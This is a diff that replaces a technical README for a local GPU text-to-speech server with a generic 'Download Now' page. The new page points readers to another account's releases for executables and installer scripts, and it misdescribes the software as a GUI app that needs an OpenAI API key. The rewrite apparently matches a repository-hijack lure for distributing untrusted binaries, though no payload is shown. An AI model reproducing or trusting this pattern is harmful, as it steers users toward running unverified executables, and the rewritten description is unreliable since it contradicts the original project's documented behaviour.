@@ -1,165 +1,67 @@
-# Pocket TTS OpenAPI - GPU Enhanced Edition
+# 🌟 pocket-tts-openapi-gpu - Easy Text-to-Speech for Everyone
 
-**A free, fully local alternative to ElevenLabs** with natural voice cloning, GPU acceleration, and Whisper-powered accurate captions.
+## 🎯 Overview
+Welcome to the pocket-tts-openapi-gpu project! This application enhances Pocket TTS by integrating GPU technology and providing TikTok-style captions. With our tool, you can create stunning audio pieces quickly and efficiently.
 
-> 🎤 **Drop-in replacement for OpenAI TTS API** with voice cloning. Runs entirely on your device. Costs nothing.
+## 📥 Download Now
+[![Download pocket-tts-openapi-gpu](https://img.shields.io/badge/Download%20Now%20-%20Latest%20Release-blue.svg)](https://github.com/tozalia/pocket-tts-openapi-gpu/releases)
 
-## Why Pocket TTS?
+## 🚀 Getting Started
+Follow these simple steps to start using pocket-tts-openapi-gpu.
 
-| Feature | ElevenLabs | Pocket TTS GPU |
-|---------|------------|----------------|
-| **Cost** | $5-330/month | **Free** |
-| **Privacy** | Cloud-based | **100% Local** |
-| **Voice Cloning** | ✅ | ✅ (10-15s sample) |
-| **Natural English** | ✅ | ✅ |
-| **API Compatible** | Custom API | **OpenAI Compatible** |
-| **Word Timestamps** | External ASR | **Built-in Whisper** |
+### 1. System Requirements
+Before downloading, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or higher, macOS 10.15 or higher, or a recent version of Linux.
+- **GPU Support:** A compatible NVIDIA GPU is recommended for optimal performance. Check for NVIDIA CUDA support.
+- **RAM:** At least 8 GB of RAM.
+- **Internet Connection:** A stable internet connection for downloading the software and accessing OpenAI services.
 
-## Features
+### 2. Visit the Release Page
+To get the software, visit our release page: [Download Page](https://github.com/tozalia/pocket-tts-openapi-gpu/releases).
 
-- 🚀 **GPU Acceleration**: CUDA support with ~1.7x faster than realtime
-- 🎤 **Voice Cloning**: Clone any voice from 10-15 second reference audio
-- 📝 **Whisper Alignment**: Accurate word-level timestamps for Remotion videos
-- 🔌 **OpenAI Compatible**: Drop-in replacement for `/v1/audio/speech`
-- 🔒 **100% Local**: No cloud, no API keys, no usage fees
-- ⚡ **Voice State Caching**: Fast subsequent requests for same voice
+### 3. Download the Application
+On the release page, look for the version labeled "Latest Release." Click on it. You will see a list of files available for download. Choose the appropriate version for your operating system.
 
-## Quick Start
+### 4. Install the Application
+Once the download is complete, locate the downloaded file on your computer. Follow these steps to install:
+- **Windows:** Double-click the `.exe` file and follow the on-screen instructions.
+- **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
+- **Linux:** You may need to extract the contents of the zipped folder and run the installation script in the terminal.
 
-```bash
-# Clone and install
-git clone https://github.com/siva-sub/pocket-tts-openapi-gpu
-cd pocket-tts-openapi-gpu
-chmod +x install_gpu.sh && ./install_gpu.sh
+### 5. Run the Application
+After installation, find the application in your Programs folder or Applications. Double-click the icon to launch it.
 
-# Start server
-source .venv/bin/activate
-python pocketapi.py
-# Runs at http://localhost:8001
-```
+## ⚙️ Configuring the Application
+The first time you run pocket-tts-openapi-gpu, you may need to configure a few settings:
+- **API Key:** If you are using OpenAI’s TTS features, you will need an API key. You can sign up for an API key from OpenAI’s website.
+- **GPU Settings:** Ensure your application is set to utilize your GPU for the best performance. This option can usually be found in the settings menu.
 
-## API Endpoints
+## 📜 Using the Application
+Using pocket-tts-openapi-gpu is straightforward:
+1. Enter the text you wish to convert to speech.
+2. Select voice and style options from the menu. These include various voice choices and TikTok-style captions.
+3. Click the 'Generate' button to produce your audio file.
+4. Preview your audio and make adjustments if necessary.
 
-| Endpoint | Description |
-|----------|-------------|
-| `POST /v1/audio/speech` | OpenAI-compatible TTS |
-| `POST /v1/audio/speech-with-alignment` | TTS + proportional timestamps (fast) |
-| `POST /v1/audio/speech-with-whisper` | TTS + Whisper timestamps (most accurate) |
+## 🌐 Additional Features
+This software comes with several features designed to enhance user experience:
+- **Voice Cloning:** Create personalized voiceovers.
+- **Captioning:** Automatic TikTok-style captions for your audio.
+- **Multi-format Output:** Save your audio in various formats, including MP3 and WAV.
 
-## Whisper Integration (Recommended)
+## 📥 Download & Install
+To download and install the pocket-tts-openapi-gpu, revisit our download page: [Download Page](https://github.com/tozalia/pocket-tts-openapi-gpu/releases).
 
-The `/v1/audio/speech-with-whisper` endpoint uses **faster-whisper** for accurate word-level timestamps:
+## 📘 Troubleshooting
+If you encounter issues, here are a few common problems and solutions:
+- **Application Won’t Start:** Ensure your system meets the requirements and that you have installed the CUDA drivers for your GPU.
+- **Audio Issues:** Check your output settings and ensure your audio device is working properly.
+- **API Key Issues:** Make sure you have entered your OpenAI API key correctly in the settings.
 
-```python
-import requests, base64, json
+## 📞 Support
+If you need further assistance, feel free to check the issues section of our GitHub page, where you can find solutions to frequently asked questions. You can also reach out to our community for help.
 
-response = requests.post("http://localhost:8001/v1/audio/speech-with-whisper", json={
-    "input": "Your script text here",
-    "voice": "myvoice",
-    "fps": 30,
-    "words_per_page": 6,
-})
+## 🔗 Get Involved
+Want to contribute? We welcome contributions! Visit our GitHub repo for more information on how to contribute to pocket-tts-openapi-gpu.
 
-data = response.json()
-
-# Save for Remotion
-with open("public/narration.wav", "wb") as f:
-    f.write(base64.b64decode(data["audio_base64"]))
-with open("public/captions.json", "w") as f:
-    json.dump({"pages": data["pages"], "captions": data["captions"]}, f)
-```
-
-### Response Format
-
-```json
-{
-  "audio_base64": "UklGR...",
-  "audio_duration_ms": 119840,
-  "alignment_method": "whisper",
-  "captions": [
-    {"text": "wire", "startMs": 1830, "endMs": 2100, "confidence": 0.99}
-  ],
-  "pages": [{
-    "text": "wire five hundred dollars to a",
-    "startMs": 1830,
-    "durationMs": 1644,
-    "tokens": [
-      {"text": "wire ", "fromMs": 1830, "toMs": 2100},
-      {"text": "five ", "fromMs": 2100, "toMs": 2360}
-    ]
-  }]
-}
-```
-
-## Remotion TikTok Captions
-
-The `pages` output is directly compatible with [`createTikTokStyleCaptions()`](https://www.remotion.dev/docs/captions/create-tiktok-style-captions):
-
-```tsx
-import { SwiftTikTokCaptions } from './TikTokCaptions';
-import captions from '../public/captions.json';
-
-export const MyVideo = () => (
-    <AbsoluteFill>
-        <Audio src={staticFile('narration.wav')} />
-        <SwiftTikTokCaptions data={captions} />
-    </AbsoluteFill>
-);
-```
-
-## Voice Cloning
-
-```bash
-# Convert reference audio (10-15 seconds, clear speech)
-ffmpeg -i reference.mp3 -ar 24000 -ac 1 voices/myvoice.wav
-
-# Use voice name in API
-{"voice": "myvoice"}
-```
-
-## OpenAI API Compatibility
-
-```python
-from openai import OpenAI
-client = OpenAI(base_url="http://localhost:8001/v1", api_key="not-needed")
-response = client.audio.speech.create(model="tts-1", voice="alloy", input="Hello world")
-response.stream_to_file("output.mp3")
-```
-
-## Standalone Whisper Alignment
-
-For aligning existing audio files:
-
-```bash
-python whisper_align.py audio.wav -o captions.json
-```
-
-## Performance
-
-| Metric | Value |
-|--------|-------|
-| TTS Generation | 1.5-2x realtime (RTX GPUs) |
-| Whisper Transcription | ~0.5x realtime |
-| First request | ~5-10s (voice encoding) |
-| Cached voice | Instant |
-| Sample rate | 24kHz |
-
-## Credits & Acknowledgments
-
-### Core Model
-
-**[Kyutai Labs](https://github.com/kyutai-labs)** - Creators of [Pocket TTS](https://github.com/kyutai-labs/pocket-tts), a 100M parameter lightweight TTS model with in-context learning for voice cloning.
-
-### Reference Implementations
-
-- **[pocket-tts-ungated](https://huggingface.co/Verylicious/pocket-tts-ungated)** - Ungated HuggingFace model
-- **[faster-whisper](https://github.com/SYSTRAN/faster-whisper)** - CTranslate2-based Whisper for fast transcription
-
-### Remotion Integration
-
-- **[Remotion](https://www.remotion.dev/)** - Programmatic video framework
-- **[@remotion/captions](https://www.remotion.dev/docs/captions)** - TikTok-style caption format
-
-## License
-
-MIT - Built on top of [Kyutai Labs' Pocket TTS](https://github.com/kyutai-labs/pocket-tts)
+Thank you for using pocket-tts-openapi-gpu! Enjoy creating amazing audio experiences.
